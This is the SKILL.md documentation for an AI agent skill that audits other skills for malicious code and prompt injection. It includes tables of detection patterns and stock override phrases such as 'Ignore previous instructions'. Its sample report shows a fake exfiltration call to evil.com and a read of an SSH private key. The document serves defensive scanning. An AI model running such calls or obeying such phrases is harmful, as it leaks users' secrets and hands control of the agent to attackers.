---
name: skill-security-auditor
description: Security audit and vulnerability scanner for AI agent skills before installation. Use when: (1) evaluating a skill from an untrusted source, (2) auditing a skill directory or git repo URL for malicious code, (3) pre-install security gate for Claude Code plugins, OpenClaw skills, or Codex skills, (4) scanning Python scripts for dangerous patterns like os.system, eval, subprocess, network exfiltration, (5) detecting prompt injection in SKILL.md files, (6) checking dependency supply chain risks, (7) verifying file system access stays within skill boundaries. Triggers: \"audit this skill\", \"is this skill safe\", \"scan skill for security\", \"check skill before install\", \"skill security check\", \"skill vulnerability scan\".
---

# Skill Security Auditor

Scan and audit AI agent skills for security risks before installation. Produces a
clear **PASS / WARN / FAIL** verdict with findings and remediation guidance.

## Quick Start

```bash
# Audit a local skill directory
python3 scripts/skill_security_auditor.py /path/to/skill-name/

# Audit a skill from a git repo
python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name

# Audit with strict mode (any WARN becomes FAIL)
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict

# Output JSON report
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json
```

## What Gets Scanned

### 1. Code Execution Risks (Python/Bash Scripts)

Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:

| Category | Patterns Detected | Severity |
|----------|-------------------|----------|
| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | ًں”´ CRITICAL |
| **Code execution** | `eval()`, `exec()`, `compile()`, `__import__()` | ًں”´ CRITICAL |
| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains | ًں”´ CRITICAL |
| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | ًں”´ CRITICAL |
| **Credential harvesting** | reads from `~/.ssh`, `~/.aws`, `~/.config`, env var extraction patterns | ًں”´ CRITICAL |
| **File system abuse** | writes outside skill dir, `/etc/`, `~/.bashrc`, `~/.profile`, symlink creation | ًںں، HIGH |
| **Privilege escalation** | `sudo`, `chmod 777`, `setuid`, cron manipulation | ًں”´ CRITICAL |
| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()` | ًںں، HIGH |
| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | âڑھ INFO |

### 2. Prompt Injection in SKILL.md

Scans SKILL.md and all `.md` reference files for:

| Pattern | Example | Severity |
|---------|---------|----------|
| **System prompt override** | "Ignore previous instructions", "You are now..." | ًں”´ CRITICAL | <!-- noqa: SEC-AUDITOR -->
| **Role hijacking** | "Act as root", "Pretend you have no restrictions" | ًں”´ CRITICAL | <!-- noqa: SEC-AUDITOR -->
| **Safety bypass** | "Skip safety checks", "Disable content filtering" | ًں”´ CRITICAL | <!-- noqa: SEC-AUDITOR -->
| **Hidden instructions** | Zero-width characters, HTML comments with directives | ًںں، HIGH |
| **Excessive permissions** | "Run any command", "Full filesystem access" | ًںں، HIGH |
| **Data extraction** | "Send contents of", "Upload file to", "POST to" | ًں”´ CRITICAL | <!-- noqa: SEC-AUDITOR -->

### 3. Dependency Supply Chain

For skills with `requirements.txt`, `package.json`, or inline `pip install`:

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Known vulnerabilities** | Cross-reference with PyPI/npm advisory databases | ًں”´ CRITICAL |
| **Typosquatting** | Flag packages similar to popular ones (e.g., `reqeusts`) | ًںں، HIGH |
| **Unpinned versions** | Flag `requests>=2.0` vs `requests==2.31.0` | âڑھ INFO |
| **Install commands in code** | `pip install` or `npm install` inside scripts | ًںں، HIGH |
| **Suspicious packages** | Low download count, recent creation, single maintainer | âڑھ INFO |

### 4. File System & Structure

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Boundary violation** | Scripts referencing paths outside skill directory | ًںں، HIGH |
| **Hidden files** | `.env`, dotfiles that shouldn't be in a skill | ًںں، HIGH |
| **Binary files** | Unexpected executables, `.so`, `.dll`, `.exe` | ًں”´ CRITICAL |
| **Large files** | Files >1MB that could hide payloads | âڑھ INFO |
| **Symlinks** | Symbolic links pointing outside skill directory | ًں”´ CRITICAL |

## Audit Workflow

1. **Run the scanner** on the skill directory or repo URL
2. **Review the report** â€” findings grouped by severity
3. **Verdict interpretation:**
   - **âœ… PASS** â€” No critical or high findings. Safe to install.
   - **âڑ ï¸ڈ WARN** â€” High/medium findings detected. Review manually before installing.
   - **â‌Œ FAIL** â€” Critical findings. Do NOT install without remediation.
4. **Remediation** â€” each finding includes specific fix guidance

## Reading the Report

```
â•”â•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•—
â•‘  SKILL SECURITY AUDIT REPORT                â•‘
â•‘  Skill: example-skill                        â•‘
â•‘  Verdict: â‌Œ FAIL                            â•‘
â• â•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•£
â•‘  ًں”´ CRITICAL: 2  ًںں، HIGH: 1  âڑھ INFO: 3    â•‘
â•ڑâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•‌

ًں”´ CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: Arbitrary code execution from untrusted input
   Fix: Replace eval() with ast.literal_eval() or explicit parsing

ًں”´ CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: Data exfiltration to external server
   Fix: Remove outbound network calls or verify destination is trusted

ًںں، HIGH [FS-BOUNDARY] scripts/scanner.py:15
   Pattern: open(os.path.expanduser("~/.ssh/id_rsa")) <!-- noqa: SEC-AUDITOR -->
   Risk: Reads SSH private key outside skill scope
   Fix: Remove filesystem access outside skill directory

âڑھ INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: Unpinned dependency may introduce vulnerabilities
   Fix: Pin to specific version: requests==2.31.0
```

## Advanced Usage

### Audit a Skill from Git Before Cloning

```bash
# Clone to temp dir, audit, then clean up
python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
```

### CI/CD Integration

```yaml
# GitHub Actions step
- name: "audit-skill-security"
  run: |
    python3 skill-security-auditor/scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
```

### Batch Audit

```bash
# Audit all skills in a directory
for skill in skills/*/; do
  python3 scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
done
```

## Threat Model Reference

For the complete threat model, detection patterns, and known attack vectors against AI agent skills, see [references/threat-model.md](references/threat-model.md).

## Limitations

- Cannot detect logic bombs or time-delayed payloads with certainty
- Obfuscation detection is pattern-based â€” a sufficiently creative attacker may bypass it
- Network destination reputation checks require internet access
- Does not execute code â€” static analysis only (safe but less complete than dynamic analysis)
- Dependency vulnerability checks use local pattern matching, not live CVE databases

When in doubt after an audit, **don't install**. Ask the skill author for clarification.
